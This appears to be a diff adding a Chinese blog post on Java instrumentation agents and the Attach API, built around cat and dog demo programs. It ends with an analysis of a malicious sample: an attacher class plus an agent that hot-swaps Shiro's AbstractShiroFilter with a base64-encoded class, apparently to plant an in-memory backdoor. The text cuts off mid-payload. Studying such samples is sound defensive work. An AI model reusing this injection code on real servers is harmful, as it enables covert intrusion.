+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;plugin&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>maven-shade-plugin<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;executions&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;execution&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;goals&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;goal&gt;</span>shade<span class="nt">&lt;/goal&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/goals&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;configuration&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;finalName&gt;</span>app<span class="nt">&lt;/finalName&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;shadedArtifactAttached&gt;</span>true<span class="nt">&lt;/shadedArtifactAttached&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;transformers&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;transformer</span> <span class="na">implementation=</span>
+</span></span><span class="line"><span class="cl">                                            <span class="s">&#34;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nt">&lt;mainClass&gt;</span>io.h2cone.inst.app.CatMain<span class="nt">&lt;/mainClass&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;/transformer&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/transformers&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/configuration&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/execution&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/executions&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/plugin&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后，得到了 agent-jar-with-dependencies.jar 和 app.jar 后，查阅 Java agent 命令行接口文档：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">-javaagent:jarpath<span class="o">[=</span>options<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>jarpath</code> 是 agent jar 文件的路径，可选的 <code>options</code> 能传递给 agent 类的 <code>premain</code> 方法，这里传递 Cat 类的命名：io/h2cone/inst/app/Cat，表示我们要测量它的方法执行时间：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">java -javaagent:agent-jar-with-dependencies.jar<span class="o">=</span>io/h2cone/inst/app/Cat -jar app.jar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果表明，不仅 Cat 类的 run 方法正常执行，而且输出了该方法的执行时间：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Cat is running
+</span></span><span class="line"><span class="cl">io.h2cone.inst.app.Cat.run(): 73993800 ns
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>完整代码已发布，请参考 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/inst-agent"  target="_blank" rel="noopener"
+    >inst-agent</a> 和 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/inst-app"  target="_blank" rel="noopener"
+    >inst-app</a>。</p>
+<h2 id="attach">Attach</h2>
+<h3 id="简述">简述</h3>
+<p>翻阅 Oracle JDK 文档可以找到名为 <code>com.sun.tools.attach</code> 的包：</p>
+<blockquote>
+<p>Provides the API to attach to a Java virtual machine. [3]</p>
+</blockquote>
+<p>在上一节，列出了加载 Java agent 的两种方式，第二种方式使用 Attach API，把 Java agent 附加到启动后的 JVM，采用这种方式<strong>无需重启 JVM</strong>。Attach 是如何实现的呢？初步大胆猜想，利用 Attach API 编写而成的程序与目标 JVM 进行了线程间通信，传输 Java agent 并装载到目标 JVM。</p>
+<blockquote>
+<p>跟踪程序通过 Unix Domain Socket 与目标 JVM 的 Attach Listener 线程进行交互。[4]</p>
+</blockquote>
+<h3 id="例子">例子</h3>
+<p>编写一只可以持续汪汪叫的小狗：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">DogMain</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">ManagementFactory</span><span class="o">.</span><span class="na">getRuntimeMXBean</span><span class="o">().</span><span class="na">getName</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="s">&#34;managed bean name: %s\n&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">10000</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">CompletableFuture</span><span class="o">.</span><span class="na">runAsync</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Woof Woof&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个程序跑起来后 20 秒内输出：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">managed bean name: 5424@borvino
+</span></span><span class="line"><span class="cl">Woof Woof
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意 managed bean name 的值为 5424@borvino，当中的 5424 就是这个进程的 PID。</p>
+<p>方便起见，编写简易的 agent 类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">OwnerAgent</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;agentmain agentArgs: &#34;</span> <span class="o">+</span> <span class="n">agentArgs</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;agentmain inst: &#34;</span> <span class="o">+</span> <span class="n">inst</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;premain agentArgs: &#34;</span> <span class="o">+</span> <span class="n">agentArgs</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;premain inst: &#34;</span> <span class="o">+</span> <span class="n">inst</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回想前文所说的获取 <code>Instrumentation</code> 实例的两种方式，当把 Java agent 附加到 JVM 时，<code>Instrumentation</code> 实例将传递到 agent 类的 <code>agentmain</code> 方法，也是就说 <code>agentmain</code> 将会被调用。</p>
+<p>不忘编写 MANIFEST.MF 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Manifest-Version: 1.0
+</span></span><span class="line"><span class="cl">Premain-Class: io.h2cone.attach.agent.OwnerAgent
+</span></span><span class="line"><span class="cl">Agent-Class: io.h2cone.attach.agent.OwnerAgent
+</span></span><span class="line"><span class="cl">Can-Redefine-Classes: true
+</span></span><span class="line"><span class="cl">Can-Retransform-Classes: true
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>既声明 <code>Agent-Class</code> 也声明 <code>Premain-Class</code>，OwnerAgent 类同时满足两种方式所要求的方法签名。</p>
+<p>与上文相似，打包好 agent.jar 后，方便起见，直接用 IDE 启动 DogMain，从控制台读取目标 JVM 的 PID，万事俱备，首先依附到 JVM，然后动态加载 agent 到 JVM，最后分离：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Test</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">attach</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span><span class="o">,</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">pid</span> <span class="o">=</span> <span class="s">&#34;pid&#34;</span><span class="o">;</span>                             <span class="c1">// 目标 JVM 的 PID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VirtualMachine</span> <span class="n">vm</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">pid</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">agentJarPath</span> <span class="o">=</span> <span class="s">&#34;path to agent.jar&#34;</span><span class="o">;</span>      <span class="c1">// agent.jar 文件的路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">String</span> <span class="n">options</span> <span class="o">=</span> <span class="s">&#34;Hello, Dog&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="n">agentJarPath</span><span class="o">,</span> <span class="n">options</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>试验结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">managed bean name: 5424@borvino
+</span></span><span class="line"><span class="cl">Woof Woof
+</span></span><span class="line"><span class="cl">agentmain agentArgs: Hello, Dog
+</span></span><span class="line"><span class="cl">agentmain inst: sun.instrument.InstrumentationImpl@4c4744d8
+</span></span><span class="line"><span class="cl">Woof Woof
+</span></span><span class="line"><span class="cl">Woof Woof
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>OwnerAgent 类的 <code>agentmain</code> 方法被调用，DogMain 的 <code>main</code> 方法也正常执行。</p>
+<p>完整代码已发布，请参考 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/attach-agent"  target="_blank" rel="noopener"
+    >attach-agent</a> 和 <a class="link" href="https://github.com/h2cone/java-examples/tree/master/attach-app"  target="_blank" rel="noopener"
+    >attach-app</a>。</p>
+<h2 id="恶意程序">恶意程序</h2>
+<p>Test.class：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">paramArrayOfString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">attach</span><span class="o">(</span><span class="n">paramArrayOfString</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">attach</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">AgentLoadException</span><span class="o">,</span> <span class="n">AgentInitializationException</span><span class="o">,</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">AttachNotSupportedException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">str1</span> <span class="o">=</span> <span class="n">paramString</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">String</span> <span class="n">str2</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;agent.jar&#34;</span><span class="o">)).</span><span class="na">getAbsolutePath</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;attaching....pid=&#34;</span> <span class="o">+</span> <span class="n">str1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">VirtualMachine</span> <span class="n">virtualMachine</span> <span class="o">=</span> <span class="n">VirtualMachine</span><span class="o">.</span><span class="na">attach</span><span class="o">(</span><span class="n">str1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">virtualMachine</span><span class="o">.</span><span class="na">loadAgent</span><span class="o">(</span><span class="n">str2</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">virtualMachine</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>agent.jar/HotSwapAgent.class：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HotSwapAgent</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">paramInstrumentation</span><span class="o">)</span> <span class="o">{}</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">agentmain</span><span class="o">(</span><span class="n">String</span> <span class="n">paramString</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">paramInstrumentation</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Class</span><span class="o">[]</span> <span class="n">arrayOfClass</span> <span class="o">=</span> <span class="n">paramInstrumentation</span><span class="o">.</span><span class="na">getAllLoadedClasses</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">      <span class="k">for</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">:</span> <span class="n">arrayOfClass</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;org.apache.shiro.web.servlet.AbstractShiroFilter&#34;</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">          <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">          <span class="kt">byte</span><span class="o">[]</span> <span class="n">arrayOfByte</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">()).</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="s">&#34;yv66vgAAADIBbQoAYgCvCQBgALAJAGAAsQkAYACyCgBgALMKAGAAtAoAYAC1CgBgALYKAGAAtwoAuAC5CABuCgBgALoKALsAvAoAuwC9CgBgAL4JAGAAvwgAwAsAwQDCCgBgAMMKAGAAxAcAxQoAFQCvCwDGAMcHAMgKAGAAyQoAYADKCgAYAMsHAMwKAGAAzQcAzgoAHgDPBwDQCgBgANEHANMKACIA1QoAIgDWCgC4ANcLANgA2QsA2gDbBwDcCADdCwDBAN4JAN8A4AoA4QDiCADjCwAcAOQIAOUKAN8A5goANADnCADoCgA0AOkHAOoIAOsIAOwIAO0IAO4HAO8KADkA8AoAOQDxCgA5APIKAPMA9AcA9QoAPgCvCgD2APcKAD4A+AoAPgD5BwD6CwAgAPsKAEMA/AoAPgD9CgA0AP4KAEMA/woAQwD5CgBDAQAKAGABAQoAYAECCgBgAQMHAQQKAE4BBQsA2AEGBwEHCgBRAQgHAQkHAQoIAQsKAFMBDAoAYAENCAEOCwDBAQ8LARABEQgBEgsAwQETCAEUCgBgARULARYBFwcBGAoBGQEaBwEbAQAAAQAMSW5uZXJDbGFzc2VzAQADbG9nAQASTG9yZy9zbGY0ai9Mb2dnZXI7AQAWU1RBVElDX0lOSVRfUEFSQU1fTkFNRQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAA9zZWN1cml0eU1hbmFnZXIBAC1Mb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjsBABNmaWx0ZXJDaGFpblJlc29sdmVyAQA1TG9yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcjsBABxzdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJnZXRTZWN1cml0eU1hbmFnZXIBAC8oKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9tZ3QvV2ViU2VjdXJpdHlNYW5hZ2VyOwEAEnNldFNlY3VyaXR5TWFuYWdlcgEAMChMb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjspVgEAFmdldEZpbHRlckNoYWluUmVzb2x2ZXIBADcoKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9maWx0ZXIvbWd0L0ZpbHRlckNoYWluUmVzb2x2ZXI7AQAWc2V0RmlsdGVyQ2hhaW5SZXNvbHZlcgEAOChMb3JnL2FwYWNoZS9zaGlyby93ZWIvZmlsdGVyL21ndC9GaWx0ZXJDaGFpblJlc29sdmVyOylWAQAeaXNTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQADKClaAQAfc2V0U3RhdGljU2VjdXJpdHlNYW5hZ2VyRW5hYmxlZAEABChaKVYBABFvbkZpbHRlckNvbmZpZ1NldAEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zBwEcAQAnYXBwbHlTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkQ29uZmlnBwDqAQAEaW5pdAEAFWVuc3VyZVNlY3VyaXR5TWFuYWdlcgcBHQEAHGNyZWF0ZURlZmF1bHRTZWN1cml0eU1hbmFnZXIBAA5pc0h0dHBTZXNzaW9ucwEAEndyYXBTZXJ2bGV0UmVxdWVzdAEARyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAVcHJlcGFyZVNlcnZsZXRSZXF1ZXN0AQB4KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7BwEeAQATd3JhcFNlcnZsZXRSZXNwb25zZQEAfyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvU2hpcm9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABZwcmVwYXJlU2VydmxldFJlc3BvbnNlAQB5KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwcBHwEADWNyZWF0ZVN1YmplY3QBAGgoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEAG3VwZGF0ZVNlc3Npb25MYXN0QWNjZXNzVGltZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHARgHASAHASEHANwBABBkb0ZpbHRlckludGVybmFsAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgcBIgcAzAcA0AcBIwcA7wcBJAcA9QcBJQcBBwEAEWdldEV4ZWN1dGlvbkNoYWluAQB1KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwEmAQAMZXhlY3V0ZUNoYWluAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAYQWJzdHJhY3RTaGlyb0ZpbHRlci5qYXZhDABwAHEMAG4AbwwAagBrDABsAG0MAIQAcQwAhgBxDACHAHEMAHwAfQwAdAB1BwEnDAB2ASgMASkBKgcBKwwBLAEtDAEuAH0MAH4AfwwAZQBmAQAxTm8gU2VjdXJpdHlNYW5hZ2VyIGNvbmZpZ3VyZWQuICBDcmVhdGluZyBkZWZhdWx0LgcBLwwBMAExDACJAHUMAHYAdwEAMm9yZy9hcGFjaGUvc2hpcm8vd2ViL21ndC9EZWZhdWx0V2ViU2VjdXJpdHlNYW5hZ2VyBwEdDAEyAH0BADRvcmcvYXBhY2hlL3NoaXJvL3dlYi9zZXJ2bGV0L1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEzATQMAIoAfQwAcAE1AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAiwCMAQA1b3JnL2FwYWNoZS9zaGlyby93ZWIvc2VydmxldC9TaGlyb0h